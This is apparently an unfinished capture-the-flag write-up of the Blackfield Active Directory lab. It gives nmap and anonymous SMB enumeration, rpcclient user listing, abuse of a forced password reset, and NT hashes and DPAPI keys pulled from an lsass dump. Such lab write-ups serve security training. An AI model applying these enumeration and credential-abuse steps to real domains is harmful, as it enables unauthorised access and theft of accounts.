About Blackfield

Backfield is a hard difficulty Windows machine featuring Windows and Active Directory misconfigurations. Anonymous / Guest access to an SMB share is used to enumerate users. Once user is found to have Kerberos pre-authentication disabled, which allows us to conduct an ASREPRoasting attack. This allows us to retrieve a hash of the encrypted material contained in the AS-REP, which can be subjected to an offline brute force attack in order to recover the plaintext password. With this user we can access an SMB share containing forensics artefacts, including an lsass process dump. This contains a username and a password for a user with WinRM privileges, who is also a member of the Backup Operators group. The privileges conferred by this privileged group are used to dump the Active Directory database, and retrieve the hash of the primary domain administrator.

# Nmap
```shell
nmap -A 10.10.10.192 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-20 07:40 EDT
Nmap scan report for 10.10.10.192
Host is up (0.031s latency).
Not shown: 993 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-04-20 18:41:56Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-04-20T18:41:58
|_  start_date: N/A
|_clock-skew: 7h01m06s

```

# SMB Null Authentication
```shell
$ smbclient -L //10.10.10.192 -N 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        profiles$       Disk      
        SYSVOL          Disk      Logon server share 

```

# RPClient with Support User
```shell
rpcclient 10.10.10.192 -U support
Password for [WORKGROUP\support]:
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[audit2020] rid:[0x44f]
user:[support] rid:[0x450]
user:[BLACKFIELD764430] rid:[0x451]
user:[BLACKFIELD538365] rid:[0x452]
user:[BLACKFIELD189208] rid:[0x453]
user:[BLACKFIELD404458] rid:[0x454]
user:[BLACKFIELD706381] rid:[0x455]
user:[BLACKFIELD937395] rid:[0x456]
user:[BLACKFIELD553715] rid:[0x457]
user:[BLACKFIELD840481] rid:[0x458]
user:[BLACKFIELD622501] rid:[0x459]
user:[BLACKFIELD787464] rid:[0x45a]
user:[BLACKFIELD163183] rid:[0x45b]
user:[BLACKFIELD869335] rid:[0x45c]
user:[BLACKFIELD319016] rid:[0x45d]
user:[BLACKFIELD600999] rid:[0x45e]
user:[BLACKFIELD894905] rid:[0x45f]
user:[BLACKFIELD253541] rid:[0x460]
user:[BLACKFIELD175204] rid:[0x461]
user:[BLACKFIELD727512] rid:[0x462]
user:[BLACKFIELD227380] rid:[0x463]
user:[BLACKFIELD251003] rid:[0x464]
user:[BLACKFIELD129328] rid:[0x465]
user:[BLACKFIELD616527] rid:[0x466]
user:[BLACKFIELD533551] rid:[0x467]
user:[BLACKFIELD883784] rid:[0x468]
user:[BLACKFIELD908329] rid:[0x469]
user:[BLACKFIELD601590] rid:[0x46a]
user:[BLACKFIELD573498] rid:[0x46b]
user:[BLACKFIELD290325] rid:[0x46c]
user:[BLACKFIELD775986] rid:[0x46d]
user:[BLACKFIELD348433] rid:[0x46e]
user:[BLACKFIELD196444] rid:[0x46f]
user:[BLACKFIELD137694] rid:[0x470]
user:[BLACKFIELD533886] rid:[0x471]
user:[BLACKFIELD268320] rid:[0x472]
user:[BLACKFIELD909590] rid:[0x473]
user:[BLACKFIELD136813] rid:[0x474]
user:[BLACKFIELD358090] rid:[0x475]
user:[BLACKFIELD561870] rid:[0x476]
user:[BLACKFIELD269538] rid:[0x477]
user:[BLACKFIELD169035] rid:[0x478]
user:[BLACKFIELD118321] rid:[0x479]
user:[BLACKFIELD592556] rid:[0x47a]
user:[BLACKFIELD618519] rid:[0x47b]
user:[BLACKFIELD329802] rid:[0x47c]
user:[BLACKFIELD753480] rid:[0x47d]
user:[BLACKFIELD837541] rid:[0x47e]
user:[BLACKFIELD186980] rid:[0x47f]
user:[BLACKFIELD419600] rid:[0x480]
user:[BLACKFIELD220786] rid:[0x481]
user:[BLACKFIELD767820] rid:[0x482]
user:[BLACKFIELD549571] rid:[0x483]
user:[BLACKFIELD411740] rid:[0x484]
user:[BLACKFIELD768095] rid:[0x485]
user:[BLACKFIELD835725] rid:[0x486]
user:[BLACKFIELD251977] rid:[0x487]
user:[BLACKFIELD430864] rid:[0x488]
user:[BLACKFIELD413242] rid:[0x489]
user:[BLACKFIELD464763] rid:[0x48a]
user:[BLACKFIELD266096] rid:[0x48b]
user:[BLACKFIELD334058] rid:[0x48c]
user:[BLACKFIELD404213] rid:[0x48d]
user:[BLACKFIELD219324] rid:[0x48e]
user:[BLACKFIELD412798] rid:[0x48f]
user:[BLACKFIELD441593] rid:[0x490]
user:[BLACKFIELD606328] rid:[0x491]
user:[BLACKFIELD796301] rid:[0x492]
user:[BLACKFIELD415829] rid:[0x493]
user:[BLACKFIELD820995] rid:[0x494]
user:[BLACKFIELD695166] rid:[0x495]
user:[BLACKFIELD759042] rid:[0x496]
user:[BLACKFIELD607290] rid:[0x497]
user:[BLACKFIELD229506] rid:[0x498]
user:[BLACKFIELD256791] rid:[0x499]
user:[BLACKFIELD997545] rid:[0x49a]
user:[BLACKFIELD114762] rid:[0x49b]
user:[BLACKFIELD321206] rid:[0x49c]
user:[BLACKFIELD195757] rid:[0x49d]
user:[BLACKFIELD877328] rid:[0x49e]
user:[BLACKFIELD446463] rid:[0x49f]
user:[BLACKFIELD579980] rid:[0x4a0]
user:[BLACKFIELD775126] rid:[0x4a1]
user:[BLACKFIELD429587] rid:[0x4a2]
user:[BLACKFIELD534956] rid:[0x4a3]
user:[BLACKFIELD315276] rid:[0x4a4]
user:[BLACKFIELD995218] rid:[0x4a5]
user:[BLACKFIELD843883] rid:[0x4a6]
user:[BLACKFIELD876916] rid:[0x4a7]
user:[BLACKFIELD382769] rid:[0x4a8]
user:[BLACKFIELD194732] rid:[0x4a9]
user:[BLACKFIELD191416] rid:[0x4aa]
user:[BLACKFIELD932709] rid:[0x4ab]
user:[BLACKFIELD546640] rid:[0x4ac]
user:[BLACKFIELD569313] rid:[0x4ad]
user:[BLACKFIELD744790] rid:[0x4ae]
user:[BLACKFIELD739659] rid:[0x4af]
user:[BLACKFIELD926559] rid:[0x4b0]
user:[BLACKFIELD969352] rid:[0x4b1]
user:[BLACKFIELD253047] rid:[0x4b2]
user:[BLACKFIELD899433] rid:[0x4b3]
user:[BLACKFIELD606964] rid:[0x4b4]
user:[BLACKFIELD385719] rid:[0x4b5]
user:[BLACKFIELD838710] rid:[0x4b6]
user:[BLACKFIELD608914] rid:[0x4b7]
user:[BLACKFIELD569653] rid:[0x4b8]
user:[BLACKFIELD759079] rid:[0x4b9]
user:[BLACKFIELD488531] rid:[0x4ba]
user:[BLACKFIELD160610] rid:[0x4bb]
user:[BLACKFIELD586934] rid:[0x4bc]
user:[BLACKFIELD819822] rid:[0x4bd]
user:[BLACKFIELD739765] rid:[0x4be]
user:[BLACKFIELD875008] rid:[0x4bf]
user:[BLACKFIELD441759] rid:[0x4c0]
user:[BLACKFIELD763893] rid:[0x4c1]
user:[BLACKFIELD713470] rid:[0x4c2]
user:[BLACKFIELD131771] rid:[0x4c3]
user:[BLACKFIELD793029] rid:[0x4c4]
user:[BLACKFIELD694429] rid:[0x4c5]
user:[BLACKFIELD802251] rid:[0x4c6]
user:[BLACKFIELD602567] rid:[0x4c7]
user:[BLACKFIELD328983] rid:[0x4c8]
user:[BLACKFIELD990638] rid:[0x4c9]
user:[BLACKFIELD350809] rid:[0x4ca]
user:[BLACKFIELD405242] rid:[0x4cb]
user:[BLACKFIELD267457] rid:[0x4cc]
user:[BLACKFIELD686428] rid:[0x4cd]
user:[BLACKFIELD478828] rid:[0x4ce]
user:[BLACKFIELD129387] rid:[0x4cf]
user:[BLACKFIELD544934] rid:[0x4d0]
user:[BLACKFIELD115148] rid:[0x4d1]
user:[BLACKFIELD753537] rid:[0x4d2]
user:[BLACKFIELD416532] rid:[0x4d3]
user:[BLACKFIELD680939] rid:[0x4d4]
user:[BLACKFIELD732035] rid:[0x4d5]
user:[BLACKFIELD522135] rid:[0x4d6]
user:[BLACKFIELD773423] rid:[0x4d7]
user:[BLACKFIELD371669] rid:[0x4d8]
user:[BLACKFIELD252379] rid:[0x4d9]
user:[BLACKFIELD828826] rid:[0x4da]
user:[BLACKFIELD548394] rid:[0x4db]
user:[BLACKFIELD611993] rid:[0x4dc]
user:[BLACKFIELD192642] rid:[0x4dd]
user:[BLACKFIELD106360] rid:[0x4de]
user:[BLACKFIELD939243] rid:[0x4df]
user:[BLACKFIELD230515] rid:[0x4e0]
user:[BLACKFIELD774376] rid:[0x4e1]
user:[BLACKFIELD576233] rid:[0x4e2]
user:[BLACKFIELD676303] rid:[0x4e3]
user:[BLACKFIELD673073] rid:[0x4e4]
user:[BLACKFIELD558867] rid:[0x4e5]
user:[BLACKFIELD184482] rid:[0x4e6]
user:[BLACKFIELD724669] rid:[0x4e7]
user:[BLACKFIELD765350] rid:[0x4e8]
user:[BLACKFIELD411132] rid:[0x4e9]
user:[BLACKFIELD128775] rid:[0x4ea]
user:[BLACKFIELD704154] rid:[0x4eb]
user:[BLACKFIELD107197] rid:[0x4ec]
user:[BLACKFIELD994577] rid:[0x4ed]
user:[BLACKFIELD683323] rid:[0x4ee]
user:[BLACKFIELD433476] rid:[0x4ef]
user:[BLACKFIELD644281] rid:[0x4f0]
user:[BLACKFIELD195953] rid:[0x4f1]
user:[BLACKFIELD868068] rid:[0x4f2]
user:[BLACKFIELD690642] rid:[0x4f3]
user:[BLACKFIELD465267] rid:[0x4f4]
user:[BLACKFIELD199889] rid:[0x4f5]
user:[BLACKFIELD468839] rid:[0x4f6]
user:[BLACKFIELD348835] rid:[0x4f7]
user:[BLACKFIELD624385] rid:[0x4f8]
user:[BLACKFIELD818863] rid:[0x4f9]
user:[BLACKFIELD939200] rid:[0x4fa]
user:[BLACKFIELD135990] rid:[0x4fb]
user:[BLACKFIELD484290] rid:[0x4fc]
user:[BLACKFIELD898237] rid:[0x4fd]
user:[BLACKFIELD773118] rid:[0x4fe]
user:[BLACKFIELD148067] rid:[0x4ff]
user:[BLACKFIELD390179] rid:[0x500]
user:[BLACKFIELD359278] rid:[0x501]
user:[BLACKFIELD375924] rid:[0x502]
user:[BLACKFIELD533060] rid:[0x503]
user:[BLACKFIELD534196] rid:[0x504]
user:[BLACKFIELD639103] rid:[0x505]
user:[BLACKFIELD933887] rid:[0x506]
user:[BLACKFIELD907614] rid:[0x507]
user:[BLACKFIELD991588] rid:[0x508]
user:[BLACKFIELD781404] rid:[0x509]
user:[BLACKFIELD787995] rid:[0x50a]
user:[BLACKFIELD911926] rid:[0x50b]
user:[BLACKFIELD146200] rid:[0x50c]
user:[BLACKFIELD826622] rid:[0x50d]
user:[BLACKFIELD171624] rid:[0x50e]
user:[BLACKFIELD497216] rid:[0x50f]
user:[BLACKFIELD839613] rid:[0x510]
user:[BLACKFIELD428532] rid:[0x511]
user:[BLACKFIELD697473] rid:[0x512]
user:[BLACKFIELD291678] rid:[0x513]
user:[BLACKFIELD623122] rid:[0x514]
user:[BLACKFIELD765982] rid:[0x515]
user:[BLACKFIELD701303] rid:[0x516]
user:[BLACKFIELD250576] rid:[0x517]
user:[BLACKFIELD971417] rid:[0x518]
user:[BLACKFIELD160820] rid:[0x519]
user:[BLACKFIELD385928] rid:[0x51a]
user:[BLACKFIELD848660] rid:[0x51b]
user:[BLACKFIELD682842] rid:[0x51c]
user:[BLACKFIELD813266] rid:[0x51d]
user:[BLACKFIELD274577] rid:[0x51e]
user:[BLACKFIELD448641] rid:[0x51f]
user:[BLACKFIELD318077] rid:[0x520]
user:[BLACKFIELD289513] rid:[0x521]
user:[BLACKFIELD336573] rid:[0x522]
user:[BLACKFIELD962495] rid:[0x523]
user:[BLACKFIELD566117] rid:[0x524]
user:[BLACKFIELD617630] rid:[0x525]
user:[BLACKFIELD717683] rid:[0x526]
user:[BLACKFIELD390192] rid:[0x527]
user:[BLACKFIELD652779] rid:[0x528]
user:[BLACKFIELD665997] rid:[0x529]
user:[BLACKFIELD998321] rid:[0x52a]
user:[BLACKFIELD946509] rid:[0x52b]
user:[BLACKFIELD228442] rid:[0x52c]
user:[BLACKFIELD548464] rid:[0x52d]
user:[BLACKFIELD586592] rid:[0x52e]
user:[BLACKFIELD512331] rid:[0x52f]
user:[BLACKFIELD609423] rid:[0x530]
user:[BLACKFIELD395725] rid:[0x531]
user:[BLACKFIELD438923] rid:[0x532]
user:[BLACKFIELD691480] rid:[0x533]
user:[BLACKFIELD236467] rid:[0x534]
user:[BLACKFIELD895235] rid:[0x535]
user:[BLACKFIELD788523] rid:[0x536]
user:[BLACKFIELD710285] rid:[0x537]
user:[BLACKFIELD357023] rid:[0x538]
user:[BLACKFIELD362337] rid:[0x539]
user:[BLACKFIELD651599] rid:[0x53a]
user:[BLACKFIELD579344] rid:[0x53b]
user:[BLACKFIELD859776] rid:[0x53c]
user:[BLACKFIELD789969] rid:[0x53d]
user:[BLACKFIELD356727] rid:[0x53e]
user:[BLACKFIELD962999] rid:[0x53f]
user:[BLACKFIELD201655] rid:[0x540]
user:[BLACKFIELD635996] rid:[0x541]
user:[BLACKFIELD478410] rid:[0x542]
user:[BLACKFIELD518316] rid:[0x543]
user:[BLACKFIELD202900] rid:[0x544]
user:[BLACKFIELD767498] rid:[0x545]
user:[BLACKFIELD103974] rid:[0x546]
user:[BLACKFIELD135403] rid:[0x547]
user:[BLACKFIELD112766] rid:[0x548]
user:[BLACKFIELD978938] rid:[0x549]
user:[BLACKFIELD871753] rid:[0x54a]
user:[BLACKFIELD136203] rid:[0x54b]
user:[BLACKFIELD634593] rid:[0x54c]
user:[BLACKFIELD274367] rid:[0x54d]
user:[BLACKFIELD520852] rid:[0x54e]
user:[BLACKFIELD339143] rid:[0x54f]
user:[BLACKFIELD684814] rid:[0x550]
user:[BLACKFIELD792484] rid:[0x551]
user:[BLACKFIELD802875] rid:[0x552]
user:[BLACKFIELD383108] rid:[0x553]
user:[BLACKFIELD318250] rid:[0x554]
user:[BLACKFIELD496547] rid:[0x555]
user:[BLACKFIELD219914] rid:[0x556]
user:[BLACKFIELD454313] rid:[0x557]
user:[BLACKFIELD460131] rid:[0x558]
user:[BLACKFIELD613771] rid:[0x559]
user:[BLACKFIELD632329] rid:[0x55a]
user:[BLACKFIELD402639] rid:[0x55b]
user:[BLACKFIELD235930] rid:[0x55c]
user:[BLACKFIELD246388] rid:[0x55d]
user:[BLACKFIELD946435] rid:[0x55e]
user:[BLACKFIELD739227] rid:[0x55f]
user:[BLACKFIELD827906] rid:[0x560]
user:[BLACKFIELD198927] rid:[0x561]
user:[BLACKFIELD169876] rid:[0x562]
user:[BLACKFIELD150357] rid:[0x563]
user:[BLACKFIELD594619] rid:[0x564]
user:[BLACKFIELD274109] rid:[0x565]
user:[BLACKFIELD682949] rid:[0x566]
user:[BLACKFIELD316850] rid:[0x567]
user:[BLACKFIELD884808] rid:[0x568]
user:[BLACKFIELD327610] rid:[0x569]
user:[BLACKFIELD899238] rid:[0x56a]
user:[BLACKFIELD184493] rid:[0x56b]
user:[BLACKFIELD631162] rid:[0x56c]
user:[BLACKFIELD591846] rid:[0x56d]
user:[BLACKFIELD896715] rid:[0x56e]
user:[BLACKFIELD500073] rid:[0x56f]
user:[BLACKFIELD584113] rid:[0x570]
user:[BLACKFIELD204805] rid:[0x571]
user:[BLACKFIELD842593] rid:[0x572]
user:[BLACKFIELD397679] rid:[0x573]
user:[BLACKFIELD842438] rid:[0x574]
user:[BLACKFIELD286615] rid:[0x575]
user:[BLACKFIELD224839] rid:[0x576]
user:[BLACKFIELD631599] rid:[0x577]
user:[BLACKFIELD247450] rid:[0x578]
user:[BLACKFIELD290582] rid:[0x579]
user:[BLACKFIELD657263] rid:[0x57a]
user:[BLACKFIELD314351] rid:[0x57b]
user:[BLACKFIELD434395] rid:[0x57c]
user:[BLACKFIELD410243] rid:[0x57d]
user:[BLACKFIELD307633] rid:[0x57e]
user:[BLACKFIELD758945] rid:[0x57f]
user:[BLACKFIELD541148] rid:[0x580]
user:[BLACKFIELD532412] rid:[0x581]
user:[BLACKFIELD996878] rid:[0x582]
user:[BLACKFIELD653097] rid:[0x583]
user:[BLACKFIELD438814] rid:[0x584]
user:[svc_backup] rid:[0x585]
user:[lydericlefebvre] rid:[0x586]

```

# Bloodhound
So the support user has 'ForceChangePassword' rights of audit2020 which is interesting. 
![[Pasted image 20240422055142.png]]


# Forensic Share
```shell
└─$ smbclient \\\\10.10.10.192\\forensic -U 'audit2020%abc123!'
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Feb 23 08:03:16 2020
  ..                                  D        0  Sun Feb 23 08:03:16 2020
  commands_output                     D        0  Sun Feb 23 13:14:37 2020
  memory_analysis                     D        0  Thu May 28 16:28:33 2020
  tools                               D        0  Sun Feb 23 08:39:08 2020


```

## domains_admin.txt
```text
cat domain_admins.txt                      
��Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator       Ipwn3dYourCompany     
The command completed successfully.

```

## domain_groups.txt
```text
at domain_groups.txt 
��
Group Accounts for \\DC01

-------------------------------------------------------------------------------
*Cloneable Domain Controllers
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*Group Policy Creator Owners
*Key Admins
*Protected Users
*Read-only Domain Controllers
*Schema Admins
The command completed successfully.

```

## systeminfo.txt
```text
at systeminfo.txt 
��
Host Name:                 DC01
OS Name:                   Microsoft Windows Server 2019 Standard Evaluation
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Primary Domain Controller
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00431-10000-00000-AA435
Original Install Date:     2/1/2020, 11:04:40 AM
System Boot Time:          2/23/2020, 3:13:56 AM
System Manufacturer:       innotek GmbH
System Model:              VirtualBox
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 142 Stepping 10 GenuineIntel ~1801 Mhz
BIOS Version:              innotek GmbH VirtualBox, 12/1/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              fr;French (France)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,048 MB
Available Physical Memory: 901 MB
Virtual Memory: Max Size:  5,283 MB
Virtual Memory: Available: 2,891 MB
Virtual Memory: In Use:    2,392 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    BLACKFIELD.local
Logon Server:              \\DC01
Hotfix(s):                 3 Hotfix(s) Installed.
                           [01]: KB4514366
                           [02]: KB4512577
                           [03]: KB4512578
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Desktop Adapter
                                 Connection Name: Ethernet
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.86.156
Hyper-V Requirements:      VM Monitor Mode Extensions: No
                           Virtualization Enabled In Firmware: No
                           Second Level Address Translation: No
                           Data Execution Prevention Available: Yes

```

## Route.txt
```
└─$ cat route.txt     
��===========================================================================
Interface List
  3...08 00 27 f3 dc 8d ......Intel(R) PRO/1000 MT Desktop Adapter
  1...........................Software Loopback Interface 1
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0     192.168.86.1   192.168.86.156    281
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
     192.168.86.0    255.255.255.0         On-link    192.168.86.156    281
   192.168.86.156  255.255.255.255         On-link    192.168.86.156    281
   192.168.86.255  255.255.255.255         On-link    192.168.86.156    281
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link    192.168.86.156    281
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link    192.168.86.156    281
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0     192.168.86.1  Default 
===========================================================================

IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  1    331 ::1/128                  On-link
  1    331 ff00::/8                 On-link
===========================================================================
Persistent Routes:

```

# Lsass.dmp

Found the Admin ntlm and svc_backup

### SVC_Backup
```
== LogonSession ==
authentication_id 406499 (633e3)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406499
 == MSV ==
  Username: svc_backup
  Domain: BLACKFIELD
  LM: NA
  NT: 9658d1d1dcd9250115e2205d9f48400d
  SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
  DPAPI: a03cd8e9d30171f3cfe8caad92fef621
 == WDIGEST [633e3]==
  username svc_backup
  domainname BLACKFIELD
  password None
  password (hex)
 == Kerberos ==
  Username: svc_backup
  Domain: BLACKFIELD.LOCAL
 == WDIGEST [633e3]==
  username svc_backup
  domainname BLACKFIELD
  password None
  password (hex)
 == DPAPI [633e3]==
  luid 406499
  key_guid 836e8326-d136-4b9f-94c7-3353c4e45770
  masterkey 0ab34d5f8cb6ae5ec44a4cb49ff60c8afdf0b465deb9436eebc2fcb1999d5841496c3ffe892b0a6fed6742b1e13a5aab322b6ea50effab71514f3dbeac025bdf
  sha1_masterkey 6efc8aa0abb1f2c19e101fbd9bebfb0979c4a991


```
### Admin
```== LogonSession ==
authentication_id 153705 (25869)
session_id 1
username Administrator
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T17:59:04.506080+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-500
luid 153705
 == MSV ==
  Username: Administrator
  Domain: BLACKFIELD
  LM: NA
  NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
  SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368
  DPAPI: 240339f898b6ac4ce3f34702e4a89550
 == WDIGEST [25869]==
  username Administrator
  domainname BLACKFIELD
  password None
  password (hex)
 == Kerberos ==
  Username: Administrator
  Domain: BLACKFIELD.LOCAL
 == WDIGEST [25869]==
  username Administrator
  domainname BLACKFIELD
  password None
  password (hex)
 == DPAPI [25869]==
  luid 153705
  key_guid d1f69692-cfdc-4a80-959e-bab79c9c327e
  masterkey 769c45bf7ceb3c0e28fb78f2e355f7072873930b3c1d3aef0e04ecbb3eaf16aa946e553007259bf307eb740f222decadd996ed660ffe648b0440d84cd97bf5a5
  sha1_masterkey d04452f8459a46460939ced67b971bcf27cb2fb9


```